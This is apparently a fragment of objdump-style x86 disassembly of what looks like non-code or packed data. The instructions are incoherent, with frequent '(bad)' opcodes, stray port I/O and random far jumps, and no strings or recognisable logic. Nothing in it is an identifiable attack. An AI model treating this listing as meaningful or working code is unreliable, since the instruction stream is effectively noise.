  4142da:	mov    ds:0x8123ce63,al
  4142df:	xchg   esi,eax
  4142e0:	lds    esp,FWORD PTR [edx+edi*1+0x1413a378]
  4142e7:	mov    BYTE PTR [edx-0x6d985312],bl
  4142ed:	push   cs
  4142ee:	div    BYTE PTR [ebx+0x48]
  4142f1:	ds cs dec ebp
  4142f4:	clc    
  4142f5:	xor    DWORD PTR [ebx-0x3002af1f],0x8
  4142fc:	mov    eax,0x27aa955d
  414301:	or     DWORD PTR [edx+0x4c7a26f3],ebp
  414307:	xchg   BYTE PTR [ebx-0x6],bl
  41430a:	test   al,0x98
  41430c:	lea    ebp,[ebx-0x75]
  41430f:	inc    esp
  414310:	push   0x0
	...
  414372:	add    BYTE PTR [eax],al
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	mov    ah,0x58
  414383:	mov    dh,0xeb
  414385:	aam    0x0
  414387:	add    BYTE PTR ds:0x94000001,al
  41438d:	xor    DWORD PTR gs:[ebp-0x7e],esi
  414391:	push   es
  414392:	loop   0x414358
  414394:	sbb    al,0x3f
  414396:	pop    eax
  414397:	(bad)  
  414398:	dec    ecx
  414399:	jne    0x4143e2
  41439b:	sub    al,0xc
  41439d:	rcr    DWORD PTR [ebx-0x67],cl
  4143a0:	or     bl,ch
  4143a2:	ja     0x4143da
  4143a4:	shl    BYTE PTR [esi+0x5d],0x62
  4143a8:	enter  0xd871,0xc
  4143ac:	fst    DWORD PTR [edx+0x48]
  4143af:	pop    es
  4143b0:	pushf  
  4143b1:	adc    al,0xf5
  4143b3:	std    
  4143b4:	outs   dx,BYTE PTR ds:[esi]
  4143b5:	pop    ss
  4143b6:	in     eax,0x4a
  4143b8:	add    edi,DWORD PTR [edi+0x7]
  4143bb:	dec    eax
  4143bc:	push   ebx
  4143bd:	ror    esp,0xd4
  4143c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c1:	rcl    bh,cl
  4143c3:	fimul  DWORD PTR cs:[eax+0x32e5fd25]
  4143ca:	sub    eax,0x593f3d04
  4143cf:	sbb    BYTE PTR [ecx+0x63],cl
  4143d2:	popf   
  4143d3:	call   DWORD PTR cs:[ecx-0x4e]
  4143d7:	out    dx,al
  4143d8:	pop    ebp
  4143d9:	mov    ah,0xc4
  4143db:	outs   dx,DWORD PTR ds:[esi]
  4143dc:	mov    eax,0x979d4b67
  4143e1:	arpl   WORD PTR [edx],bx
  4143e3:	sub    edx,DWORD PTR [ebp-0xa]
  4143e6:	inc    esp
  4143e7:	lock lahf 
  4143e9:	push   ebp
  4143ea:	mov    ds:0xdcb60c6b,al
  4143ef:	out    dx,eax
  4143f0:	jecxz  0x4143f1
  4143f2:	xchg   esi,eax
  4143f3:	lahf   
  4143f4:	adc    DWORD PTR ds:0xe3c2b0c3,ecx
  4143fa:	lahf   
  4143fb:	js     0x414387
  4143fd:	mov    edx,0x4a33e147
  414402:	fsub   st,st(4)
  414404:	push   es
  414405:	adc    al,0x80
  414407:	inc    ebx
  414408:	jo     0x41445b
  41440a:	icebp  
  41440b:	push   cs
  41440c:	and    al,0xd9
  41440e:	push   0x7362ab9f
  414413:	cmp    edi,DWORD PTR [esi+0x51]
  414416:	popa   
  414417:	imul   eax,DWORD PTR [edi+0x7f],0x9465d9d4
  41441e:	cld    
  41441f:	enter  0xb0d5,0x9c
  414423:	push   esi
  414424:	push   cs
  414425:	push   cs
  414426:	shr    BYTE PTR [edi],cl
  414428:	mov    al,ds:0x4c836555
  41442d:	in     eax,0xfa
  41442f:	iret   
  414430:	je     0x4144ab
  414432:	(bad)  
  414433:	stos   DWORD PTR es:[edi],eax
  414434:	xchg   ebx,eax
  414435:	inc    edx
  414436:	pop    edx
  414437:	lea    esp,[eax-0x5d]
  41443a:	mov    ah,0xb
  41443c:	add    dh,BYTE PTR [ebp-0xd]
  41443f:	xchg   ebp,eax
  414440:	push   ecx
  414441:	mov    ebx,0x88adf54e
  414446:	inc    ebx
  414447:	repnz loope 0x4143d6
  41444a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41444b:	loopne 0x4143dd
  41444d:	popf   
  41444e:	push   eax
  41444f:	jp     0x41440a
  414451:	gs inc ebx
  414453:	rcr    ecx,1
  414455:	xlat   BYTE PTR ds:[ebx]
  414456:	pop    es
  414457:	sbb    al,0x48
  414459:	dec    DWORD PTR [edi]
  41445b:	xchg   esp,eax
  41445c:	aad    0xca
  41445e:	mov    ds:0x2b8a5602,al
  414463:	dec    ebx
  414464:	aad    0xfb
  414466:	pop    ebp
  414467:	in     al,dx
  414468:	push   cs
  414469:	add    ah,dh
  41446b:	jmp    0x4143ff
  41446d:	repnz mov ds:0xb8ca6133,al
  414473:	mov    esp,0x4af72064
  414478:	mov    ebp,0x7e581f28
  41447d:	inc    esp
  41447e:	xor    al,0x97
  414480:	dec    esi
  414481:	(bad)  
  414482:	xchg   ebx,eax
  414483:	push   cs
  414484:	cli    
  414485:	retf   0xad20
  414488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414489:	xor    ebx,DWORD PTR [ebx-0x7d04fcd3]
  41448f:	xchg   ch,dl
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x16]
  414501:	push   0x1c
  414503:	pop    es
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0xa1000001,al
  41450d:	mov    al,0xd4
  41450f:	out    0xdd,al
  414511:	in     eax,0x94
  414513:	jecxz  0x414589
  414515:	(bad)  
  414516:	cmp    ecx,DWORD PTR [edx+0x5819204c]
  41451c:	mov    dh,0x67
  41451e:	test   al,0xbe
  414520:	jl     0x414542
  414522:	in     al,dx
  414523:	int    0xe
  414525:	sbb    BYTE PTR [esi+0x8b5d532],cl
  41452b:	mov    ebp,0x6e5078c8
  414530:	cwde   
  414531:	imul   edi,DWORD PTR ds:0xd894468e,0x664d91a
  41453b:	popf   
  41453c:	mov    ah,BYTE PTR [ebx]
  41453e:	dec    esp
  41453f:	jmp    0xf6a4:0x668d70cf
  414546:	dec    esp
  414547:	(bad)  
  414548:	inc    ecx
  41454a:	push   ecx
  41454b:	xchg   esi,eax
  41454c:	add    eax,DWORD PTR [esi-0x40b0eefa]
  414552:	jmp    0x3e1e:0x5dc03796
  414559:	or     DWORD PTR [eax+ecx*2-0x36d6c898],ecx
  414560:	xchg   ebp,eax
  414561:	stos   DWORD PTR es:[edi],eax
  414562:	dec    edi
  414563:	aad    0xff
  414565:	sahf   
  414566:	(bad)  
  414567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414568:	cmp    ebp,DWORD PTR [eax-0x105e5f44]
  41456e:	xor    ebx,edi
  414570:	cmp    ecx,DWORD PTR [edx-0x69555eb5]
  414576:	fsub   QWORD PTR [edx+0x7448f4ce]
  41457c:	(bad)  
  41457d:	(bad)  
  41457e:	icebp  
  41457f:	sbb    ecx,DWORD PTR [edx-0x4]
  414582:	mov    cl,0x17
  414584:	pop    ss
  414585:	lock adc ebp,DWORD PTR [ecx-0x6029dcd7]
  41458c:	cli    
  41458d:	pop    esp
  41458e:	in     al,dx
  41458f:	mov    edi,0x9eb92d18
  414594:	pusha  
  414595:	loope  0x414534
  414597:	sub    ebx,DWORD PTR [eax-0x47b10c02]
  41459d:	(bad)  
  41459e:	jp     0x4145d7
  4145a0:	(bad)  
  4145a2:	adc    ah,BYTE PTR [ebx-0x4ed42d76]
  4145a8:	push   0xffffffd3
  4145aa:	out    0xdd,al
  4145ac:	aas    
  4145ad:	mov    ds:0xde45daa5,al
  4145b2:	fdivr  QWORD PTR [edi+0x4b]
  4145b5:	shr    BYTE PTR [ecx],1
  4145b7:	popf   
  4145b8:	adc    al,0x75
  4145ba:	lea    ebx,[ecx-0x5b]
  4145bd:	iret   
  4145be:	je     0x414626
  4145c0:	mov    ebx,0x4c597254
  4145c5:	xchg   edx,eax
  4145c6:	call   0x338cda34
  4145cb:	popa   
  4145cc:	loope  0x414574
  4145ce:	sbb    ecx,DWORD PTR [ebx]
  4145d0:	cs add eax,0x91a0af1e
  4145d6:	mov    ds:0x325a36ed,al
  4145db:	or     eax,0x3f3c56be
  4145e0:	into   
  4145e1:	retf   
  4145e2:	pop    ss
  4145e3:	shl    BYTE PTR [edx+edi*8-0x4fe43322],0xd7
  4145eb:	rol    eax,0x8b
  4145ee:	cmp    DWORD PTR [esi+0x17],0xaa1da9da
  4145f5:	(bad)  
  4145f6:	xor    bl,al
  4145f8:	jnp    0x4145a2
  4145fa:	mov    ch,0x73
  4145fc:	push   0x95c0a673
  414601:	cs test eax,0xad9d7821
  414607:	add    DWORD PTR [ebx+0x7ced53c0],esi
  41460d:	data16 arpl WORD PTR [eax+0x1b],bx
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xeb
  414681:	test   al,0x7b
  414683:	loop   0x41467a
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0xc6000001
  41468d:	adc    ch,BYTE PTR [esi]
  41468f:	rcr    BYTE PTR [ebx],cl
  414691:	and    ebp,edx
  414693:	pusha  
  414694:	push   eax
  414695:	leave  
  414696:	int3   
  414697:	das    
  414698:	push   edi
  414699:	sub    al,0xe4
  41469b:	leave  
  41469c:	cmp    BYTE PTR [edi],bl
  41469e:	push   esi
  41469f:	loop   0x41464e
  4146a1:	pushf  
  4146a2:	ss shl dl,cl
  4146a5:	lods   eax,DWORD PTR ds:[esi]
  4146a6:	call   0xcc1c3422
  4146ab:	mov    edi,0xea9b9650
  4146b0:	ds leave 
  4146b2:	inc    ecx
  4146b3:	dec    esi
  4146b4:	sahf   
  4146b5:	lock loop 0x41469d
  4146b8:	mov    ebp,DWORD PTR ds:0x2bec2308
  4146be:	aas    
  4146bf:	sbb    bl,BYTE PTR [edx]
  4146c1:	xchg   edx,eax
  4146c2:	into   
  4146c3:	add    eax,0x1f4038c4
  4146c8:	jbe    0x41468b
  4146ca:	(bad)  
  4146cd:	gs (bad) 
  4146d0:	cmp    al,0x1
  4146d2:	jmp    0x6133:0x870da85c
  4146d9:	daa    
  4146da:	jns    0x4146a7
  4146dc:	sub    BYTE PTR [ebp-0x1614ccb1],al
  4146e2:	jmp    0x4146e7
  4146e4:	push   cs
  4146e5:	sub    cl,0x72
  4146e8:	imul   ebp,eax,0x2508865a
  4146ee:	mov    eax,ds:0x2f66eeb6
  4146f3:	fwait
  4146f4:	out    dx,al
  4146f5:	lahf   
  4146f6:	inc    edi
  4146f7:	fdivr  DWORD PTR [ecx]
  4146f9:	cs sub dh,ch
  4146fc:	cwde   
  4146fd:	xchg   ebp,eax
  4146fe:	jns    0x414728
  414700:	mov    bl,0xee
  414702:	leave  
  414703:	jae    0x4146b9
  414705:	stos   BYTE PTR es:[edi],al
  414706:	ret    0x9a03
  414709:	and    al,0xf6
  41470b:	out    dx,eax
  41470c:	in     eax,dx
  41470d:	hlt    
  41470e:	jecxz  0x414738
  414710:	sar    DWORD PTR [esi+eax*1],0x24
  414714:	outs   dx,DWORD PTR ds:[esi]
  414715:	inc    edi
  414716:	xor    ah,bh
  414718:	ror    BYTE PTR [edx],cl
  41471a:	xor    ebp,ebp
  41471c:	outs   dx,BYTE PTR ds:[esi]
  41471d:	mov    ds:0x46dac5ca,eax
  414722:	call   0x8a8d:0x37a7c306
  414729:	std    
  41472a:	mov    ebp,0x99207654
  41472f:	mov    eax,0x77a46d0e
  414734:	jmp    0xf69b:0x9fa5253f
  41473b:	and    BYTE PTR [edi-0x6db73068],dh
  414741:	jns    0x4147a8
  414743:	sbb    BYTE PTR [esi-0x2c405d62],ch
  414749:	xchg   ebx,eax
  41474a:	or     BYTE PTR [edi-0x6f],cl
  41474d:	stos   BYTE PTR es:[edi],al
  41474e:	not    edx
  414750:	jl     0x414768
  414752:	out    dx,al
  414753:	jbe    0x414753
  414755:	scas   eax,DWORD PTR es:[edi]
  414756:	loop   0x41479e
  414758:	imul   ebx,DWORD PTR [edi+0x5f],0xd5440960
  41475f:	cmp    ebx,esp
  414761:	mov    cl,0x99
  414763:	push   es
  414764:	sbb    eax,0x852a33ba
  414769:	adc    DWORD PTR [edx-0x36],esp
  41476c:	xchg   BYTE PTR [ebx-0x3f3bef18],cl
  414772:	mov    edi,0x35e75faa
  414777:	xchg   edx,eax
  414778:	cmp    eax,0x6d59a715
  41477d:	or     BYTE PTR [eax],ah
  41477f:	inc    ecx
  414780:	xor    al,0xcb
  414782:	das    
  414783:	push   cs
  414784:	es (bad) 
  414786:	dec    ebx
  414787:	or     eax,0x975d0302
  41478c:	mov    ebx,0xab7e1e4
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x20e03dd6
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x74000001
  41480d:	push   ecx
  41480e:	xor    eax,0x8df7e4d2
  414813:	sbb    ah,BYTE PTR [ecx+0x4c0e0e68]
  414819:	cs cmp al,0x5d
  41481c:	or     al,0x4e
  41481e:	xor    BYTE PTR [ecx-0x69d141c4],dl
  414824:	pop    esp
  414825:	dec    edi
  414826:	cli    
  414827:	dec    eax
  414828:	retf   
  414829:	cmc    
  41482a:	dec    edi
  41482b:	push   ecx
  41482c:	xchg   DWORD PTR [edi],esp
  41482e:	fs (bad) 
  414830:	push   esi
  414831:	push   eax
  414832:	mov    ebp,0xb5d8d166
  414837:	pusha  
  414838:	and    BYTE PTR [eax],ch
  41483a:	adc    edx,DWORD PTR [esi+eax*1-0x741d480f]
  414841:	adc    BYTE PTR [edx-0x3811396c],bh
  414847:	or     al,0x3b
  414849:	fs call 0xe368:0x11cc88cb
  414851:	loopne 0x414872
  414853:	sbb    eax,0x5fa4a2d0
  414858:	repnz push 0xfffffff5
  41485b:	push   cs
  41485c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41485d:	and    BYTE PTR [esi+esi*8+0x696e9769],bl
  414864:	mov    al,ds:0xb0be5e61
  414869:	div    BYTE PTR [edx]
  41486b:	(bad)  
  41486c:	ffreep st(2)
  41486e:	into   
  41486f:	push   ebx
  414870:	push   eax
  414871:	loop   0x414831
  414873:	ss adc al,0xa2
  414876:	sbb    eax,0x24f1fb79
  41487b:	mov    ebx,DWORD PTR [eax+edi*2+0x6e4440c2]
  414882:	in     al,dx
  414883:	outs   dx,BYTE PTR ds:[esi]
  414884:	loope  0x414893
  414886:	push   0xd544fca
  41488b:	or     eax,DWORD PTR [esi]
  41488d:	lock mov bh,0x29
  414890:	call   0x394c:0x8a68346a
  414897:	and    ecx,DWORD PTR [ecx-0x5d9e6a6f]
  41489d:	fidivr DWORD PTR [ecx-0x5b1a2811]
  4148a3:	cmp    eax,0x153e7f89
  4148a8:	sub    ch,0xf2
  4148ab:	cmp    eax,DWORD PTR ds:0xce31d243
  4148b1:	jae    0x414882
  4148b3:	add    al,0xea
  4148b5:	cmp    BYTE PTR [edx-0x13],bl
  4148b8:	push   ecx
  4148b9:	pop    esp
  4148ba:	xchg   BYTE PTR [esi-0x41],dh
  4148bd:	daa    
  4148be:	xor    eax,0xfe73b6cc
  4148c3:	and    DWORD PTR [edi-0x63],0xa91f04ca
  4148ca:	rcr    dl,0x11
  4148cd:	sti    
  4148ce:	xor    BYTE PTR [eax],ch
  4148d0:	lea    esp,[esi]
  4148d2:	sub    al,dh
  4148d4:	mov    dl,0x72
  4148d6:	mov    ebx,0x218c882b
  4148db:	and    DWORD PTR [edx+0x35],edx
  4148de:	or     al,0x20
  4148e0:	aam    0xdf
  4148e2:	push   ebx
  4148e3:	mov    ds:0xdb8c29be,eax
  4148e8:	(bad)  
  4148e9:	push   es
  4148ea:	ficom  DWORD PTR [ebx]
  4148ec:	and    eax,0x4895e453
  4148f1:	push   ecx
  4148f2:	out    0x7f,eax
  4148f4:	mov    WORD PTR [ecx],fs
  4148f6:	(bad)  
  4148f7:	push   edi
  4148f8:	jmp    0xf766:0x89015b30
  4148ff:	cmp    esp,edx
  414901:	std    
  414902:	adc    eax,0x70a76324
  414907:	sbb    BYTE PTR [ecx+0x59be7a0],bl
  41490d:	or     DWORD PTR [ebp+eiz*2+0x5],esp
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	es jmp 0x0:0xd8ff0246
  414988:	add    eax,0x4000001
  41498d:	das    
  41498e:	loop   0x4149ae
  414990:	retf   
  414991:	inc    ecx
  414992:	and    ecx,DWORD PTR [ebx+0x6a]
  414995:	data16 gs jmp 0x4149e2
  414999:	fnsave [esi]
  41499b:	pop    ds
  41499c:	and    DWORD PTR [esi+0x7b5f85cd],edi
  4149a2:	add    eax,0xc070c0ed
  4149a7:	push   eax
  4149a8:	add    DWORD PTR [edx],0x443a9ee3
  4149ae:	mov    ecx,0x5dc8d0d1
  4149b3:	or     edi,DWORD PTR [ecx-0x3632a8f6]
  4149b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ba:	pop    es
  4149bb:	jle    0x41496d
  4149bd:	and    edi,ebx
  4149bf:	jmp    0x414977
  4149c1:	inc    BYTE PTR [esi-0x1fed5204]
  4149c7:	pop    ebp
  4149c8:	lea    eax,[edi-0x6dc3c4b0]
  4149ce:	mov    cl,0x5
  4149d0:	(bad)
  4149d3:	mov    WORD PTR [ecx+0x4e],gs
  4149d6:	call   0xd512637f
  4149db:	ret    0x8b9
  4149de:	jg     0x41499c
  4149e0:	clc    
  4149e1:	inc    esi
  4149e2:	mov    ebp,edx
  4149e4:	push   es
  4149e5:	fwait
  4149e6:	lds    ebx,FWORD PTR [eax]
  4149e8:	jno    0x4149e5
  4149ea:	inc    edi
  4149eb:	dec    edx
  4149ec:	ret    
  4149ed:	in     al,dx
  4149ee:	mov    cl,0x65
  4149f0:	dec    esi
  4149f1:	dec    esi
  4149f2:	add    ebp,ebp
  4149f4:	push   esi
  4149f5:	into   
  4149f6:	int3   
  4149f7:	inc    eax
  4149f8:	stc    
  4149f9:	iret   
  4149fa:	dec    eax
  4149fb:	mov    al,ds:0xc8d49a8a
  414a00:	iret   
  414a01:	mov    edi,0x7d2ee135
  414a06:	and    DWORD PTR [ebx],esi
  414a08:	mov    ds:0x2f1583fc,eax
  414a0d:	in     al,0x61
  414a0f:	sbb    BYTE PTR [ebx],dh
  414a11:	mov    ebp,0x2b092d8
  414a16:	imul   eax,DWORD PTR [ecx-0x71],0x1f
  414a1a:	dec    ebx
  414a1b:	xor    BYTE PTR [esi+0x2c],dl
  414a1e:	cs inc eax
  414a20:	jp     0x4149b8
  414a22:	loopne 0x414a2c
  414a24:	and    dh,al
  414a26:	jmp    0x3ab3:0xdeee631a
  414a2d:	pop    es
  414a2e:	lods   eax,DWORD PTR ds:[esi]
  414a2f:	lock xor ah,BYTE PTR [ecx]
  414a32:	ror    DWORD PTR [ebp+0x28abfabb],0x95
  414a39:	mov    ch,0x66
  414a3b:	out    0x77,eax
  414a3d:	pop    ecx
  414a3e:	fcomp  DWORD PTR [ebx]
  414a40:	hlt    
  414a41:	retf   0x4db9
  414a44:	aam    0x3a
  414a46:	cmp    BYTE PTR [eax],bh
  414a48:	clc    
  414a49:	push   0x3f
  414a4b:	pop    eax
  414a4c:	adc    eax,0xd26a5c3e
  414a51:	push   cs
  414a52:	loop   0x414a47
  414a54:	dec    esi
  414a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a56:	inc    ebp
  414a57:	out    dx,eax
  414a58:	fs or  esp,ecx
  414a5b:	adc    ebx,esp
  414a5d:	clc    
  414a5e:	sti    
  414a5f:	xor    DWORD PTR [esi+ebp*4+0x4d],ebp
  414a63:	push   ebx
  414a64:	xor    esi,DWORD PTR [ecx-0x2c]
  414a67:	and    BYTE PTR [eax],dl
  414a69:	sbb    eax,0x6300d1d4
  414a6e:	mov    bl,0x71
  414a70:	push   cs
  414a71:	or     al,0xc
  414a73:	repnz mov ds:0xbaca4ae2,eax
  414a79:	xor    ebx,DWORD PTR [edi-0x39]
  414a7c:	je     0x414a5c
  414a7e:	ret    
  414a7f:	popa   
  414a80:	cdq    
  414a81:	lods   al,BYTE PTR ds:[esi]
  414a82:	ds in  al,0xc4
  414a85:	add    dh,BYTE PTR [ecx-0x43]
  414a88:	pop    eax
  414a89:	sub    ah,BYTE PTR [esp+eiz*2-0x5615862]
  414a90:	adc    al,BYTE PTR [eax]
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x657f9c27]
  414b02:	jns    0x414afc
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0x6e000001
  414b0d:	cli    
  414b0e:	nop
  414b0f:	or     al,BYTE PTR [esi]
  414b11:	xor    eax,DWORD PTR [ebx-0x6b125d4f]
  414b17:	(bad)  
  414b18:	frstor [ebx]
  414b1a:	dec    ebx
  414b1b:	xchg   ebx,eax
  414b1c:	sbb    edi,DWORD PTR ds:0xa61ad824
  414b22:	cmp    al,0xd4
  414b24:	loope  0x414b38
  414b26:	push   edi
  414b27:	dec    ecx
  414b28:	sti    
  414b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b2a:	sbb    esp,ecx
  414b2c:	mov    eax,0x94674bba
  414b31:	mov    ds:0x56d39ece,al
  414b36:	mov    ds:0x18f68f7e,eax
  414b3b:	je     0x414af4
  414b3d:	inc    esp
  414b3e:	jns    0x414af0
  414b40:	push   ss
  414b41:	repnz cmp DWORD PTR [edi+0x18],ecx
  414b45:	mov    ebp,0xd1583f3c
  414b4a:	arpl   WORD PTR [edx],si
  414b4c:	fs inc eax
  414b4e:	jmp    0x414b5b
  414b50:	push   esp
  414b51:	out    0xcd,eax
  414b53:	mov    cl,0xc3
  414b55:	clc    
  414b56:	enter  0xb186,0x61
  414b5a:	ret    0x45b1
  414b5d:	data16 aas 
  414b5f:	xchg   ebp,eax
  414b60:	or     eax,0x822f0ba8
  414b65:	push   esp
  414b66:	sbb    al,0x89
  414b68:	aad    0xe
  414b6a:	in     eax,dx
  414b6b:	push   esi
  414b6c:	mov    ebx,0xb577cf2a
  414b71:	repz jo 0x414be1
  414b74:	push   esi
  414b75:	mov    ds:0xd20b284,al
  414b7a:	repz sub edx,edi
  414b7d:	(bad)  
  414b7e:	ds xor eax,edx
  414b81:	inc    esp
  414b82:	icebp  
  414b83:	pop    ss
  414b84:	mov    ds:0xc3a30ff3,al
  414b89:	pop    ss
  414b8a:	xor    cl,ah
  414b8c:	jecxz  0x414b6f
  414b8e:	mov    eax,0xf56febc2
  414b93:	or     DWORD PTR [ebp+0x17],0x2b
  414b97:	dec    esp
  414b98:	cmp    al,0x77
  414b9a:	or     DWORD PTR [eax],esp
  414b9c:	cmp    eax,0xb632d488
  414ba1:	sar    esp,cl
  414ba3:	cwde   
  414ba4:	or     bh,BYTE PTR [eax+0x70b37533]
  414baa:	inc    edi
  414bab:	imul   esi,eax,0xfd1b84b2
  414bb1:	xchg   edx,eax
  414bb2:	daa    
  414bb3:	sbb    DWORD PTR [ebp-0x6c4beea8],ebp
  414bb9:	(bad)  
  414bba:	rcl    DWORD PTR [edi-0x62336747],0xd8
  414bc1:	inc    edx
  414bc2:	cmp    bh,BYTE PTR ds:0xebbb6964
  414bc8:	add    BYTE PTR [ebx-0x2],dl
  414bcb:	or     ah,BYTE PTR [eax]
  414bcd:	mov    dl,dl
  414bcf:	dec    esi
  414bd0:	stos   DWORD PTR es:[edi],eax
  414bd1:	jo     0x414be1
  414bd3:	dec    ebp
  414bd4:	or     eax,0x63e248b1
  414bd9:	ins    BYTE PTR es:[edi],dx
  414bda:	push   0xfd0cfa4f
  414bdf:	mov    eax,0xf139c9f1
  414be4:	mov    ebx,ss
  414be6:	sbb    ebp,DWORD PTR [ecx+0x4255bd8b]
  414bec:	xchg   edx,eax
  414bed:	fisub  DWORD PTR [eax+ebx*4-0x20beff6b]
  414bf4:	add    esi,esp
  414bf6:	sbb    DWORD PTR [ecx],ebx
  414bf8:	sbb    DWORD PTR [esi],esi
  414bfa:	xchg   esi,eax
  414bfb:	mov    ebp,0x2d6f80ac
  414c00:	pop    edi
  414c01:	ins    DWORD PTR es:[edi],dx
  414c02:	into   
  414c03:	jge    0x414ba2
  414c05:	mov    ?,WORD PTR [esp+eax*8+0x78bb9d3b]
  414c0c:	xor    al,0x2e
  414c0e:	ja     0x414bf7
  414c10:	xor    eax,0x0
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebp,DWORD PTR cs:[ecx]
  414c81:	lods   al,BYTE PTR ds:[esi]
  414c82:	mov    edx,es
  414c84:	or     ebx,ebx
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    eax,0x2b000001
  414c8d:	int3   
  414c8e:	cs add eax,0x6ad31d86
  414c94:	ficom  WORD PTR [eax-0xc]
  414c97:	mov    al,ds:0x57ee1920
  414c9c:	cmp    BYTE PTR [edx+0x78c55613],ch
  414ca2:	inc    ecx
  414ca3:	mov    dh,0x92
  414ca5:	cld    
  414ca6:	(bad)  
  414ca7:	jns    0x414d18
  414ca9:	pop    ss
  414caa:	mov    DWORD PTR [edx+esi*1-0x72196560],ecx
  414cb1:	aam    0x15
  414cb3:	sbb    ecx,DWORD PTR [ecx]
  414cb5:	jmp    0x414ca1
  414cb7:	push   ebx
  414cb8:	xchg   ebx,eax
  414cb9:	mov    esp,0x339fbde2
  414cbe:	sub    BYTE PTR [eax+0x49],bl
  414cc1:	jmp    0xc6a296d4
  414cc6:	mov    BYTE PTR [eax+0x49c50eeb],dh
  414ccc:	jp     0x414d1f
  414cce:	cld    
  414ccf:	or     eax,0xd1679585
  414cd4:	scas   al,BYTE PTR es:[edi]
  414cd5:	adc    al,0xae
  414cd7:	out    dx,al
  414cd8:	mov    ecx,0x58ec5ee
  414cdd:	mov    ebx,0x38dafa30
  414ce2:	cmp    eax,0x80558de6
  414ce7:	jge    0x414c9c
  414ce9:	xor    esp,DWORD PTR [ecx]
  414ceb:	dec    edx
  414cec:	push   ss
  414ced:	inc    edi
  414cee:	(bad)  
  414cef:	arpl   dx,di
  414cf1:	mov    ds:0xa94dbbc,al
  414cf6:	pop    ss
  414cf7:	ror    ah,0xb0
  414cfa:	add    eax,0xb01eb48f
  414cff:	sub    al,0xcd
  414d01:	mov    bl,0x78
  414d03:	push   eax
  414d04:	sub    eax,0xefb89010
  414d09:	sub    cl,ah
  414d0b:	inc    ecx
  414d0c:	repnz int 0xff
  414d0f:	(bad)  
  414d10:	int3   
  414d11:	or     DWORD PTR [ebx],0xe39bc6e
  414d17:	and    ah,BYTE PTR [esp+eiz*2+0x7]
  414d1b:	xchg   esi,eax
  414d1c:	dec    eax
  414d1d:	push   0xf0e20ef0
  414d22:	add    DWORD PTR [eax],esi
  414d24:	add    bl,cl
  414d26:	into   
  414d27:	in     al,0x66
  414d29:	sti    
  414d2a:	(bad)  
  414d2b:	add    BYTE PTR [ecx-0x519f940c],cl
  414d31:	mov    ah,0x3f
  414d33:	inc    ebp
  414d34:	fsubr  st,st(3)
  414d36:	jg     0x414d6f
  414d38:	or     al,0x70
  414d3a:	jae    0x414d8d
  414d3c:	js     0x414d5d
  414d3e:	shl    DWORD PTR [edi+0x566cee20],0x9a
  414d45:	call   0x97c2c244
  414d4a:	test   BYTE PTR [ecx+0x2f],0x78
  414d4e:	scas   al,BYTE PTR es:[edi]
  414d4f:	cmp    DWORD PTR [ebp+0x68],ebp
  414d52:	jae    0x414d18
  414d54:	mov    esi,0xbd0ff2b7
  414d59:	adc    eax,0x90999b60
  414d5e:	mov    esp,0xd8fbd1b7
  414d63:	and    al,0xc4
  414d65:	gs popf 
  414d67:	outs   dx,DWORD PTR ds:[esi]
  414d68:	aam    0xb4
  414d6a:	xchg   BYTE PTR [ecx+esi*1-0x450824c1],al
  414d71:	jo     0x414dee
  414d73:	mov    al,ds:0x6d311d75
  414d78:	hlt    
  414d79:	add    eax,0x9fd2eb6e
  414d7e:	mov    esi,0xa3ca2c3
  414d83:	inc    ecx
  414d84:	jmp    0x2fe134e
  414d89:	js     0x414d84
  414d8b:	gs pop ss
  414d8d:	repnz adc eax,0x965b
	...
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xbd1a3f45
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x9e000001,al
